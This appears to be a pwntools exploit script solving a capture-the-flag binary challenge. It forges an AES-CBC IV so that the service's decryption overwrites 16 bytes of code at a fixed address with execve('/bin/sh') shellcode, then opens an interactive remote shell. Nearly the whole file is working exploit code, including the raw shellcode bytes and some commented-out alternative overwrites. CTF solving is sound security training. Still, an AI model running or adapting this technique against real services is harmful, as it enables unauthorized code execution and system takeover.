import argparse

from pwn import *
context.terminal = ['kitty']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))



key = b'/bin/sh\x00'
key += b'A'*(16 - len(key))
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
cipher = Cipher(algorithms.AES(key), modes.CBC(b'\x00'*16))


def rewrite_bytes(addr: int, orig_bytes: bytes, new_bytes: bytes):
    assert len(orig_bytes) == 16
    assert len(orig_bytes) == len(new_bytes)

    cipher = Cipher(algorithms.AES(key), modes.CBC(b'\x00'*16))

    decryptor = cipher.decryptor()

    to_enc = decryptor.update(new_bytes) + decryptor.finalize()
    crafted_iv = bytes(i^j for i,j in zip(orig_bytes, to_enc))

    r.sendafter(b"Key: ", key)
    r.sendafter(b"IV: ", crafted_iv)
    r.sendlineafter(b'Address: ', str(addr).encode())


"""
add rsp, 16
mov al, 0x3b
xor rsi, rsi
push rsp
pop rdi
syscall
"""

binary = ELF('../challenge/handout/challenge')

overwrite_addr = 0x4023c3

shellcode = b"\x48\x83\xC4\x10\xB0\x3B\x48\x31\xF6\x54\x5F\x0F\x05"
assert len(shellcode) <= 16
shellcode += b'\x90' * (16 - len(shellcode))

rewrite_bytes(
    overwrite_addr,
    binary.read(overwrite_addr, 16),
    shellcode,
)


#rewrite_bytes(
#    0x401000,
#    b'\xf3\x0f\x1e\xfa\x48\x83\xec\x08\x48\x8b\x05\xc9\x3f\x00\x00\x48',
#    b'\x90'*8 + b'\x90'*8
#)
#
#rewrite_bytes(
#    0x405010,
#    b'AAAABBBB' + 0x4020db.to_bytes(8, 'little'),
#    0x401000.to_bytes(8, 'little') + 0x401000.to_bytes(8, 'little'),
#)

r.interactive()
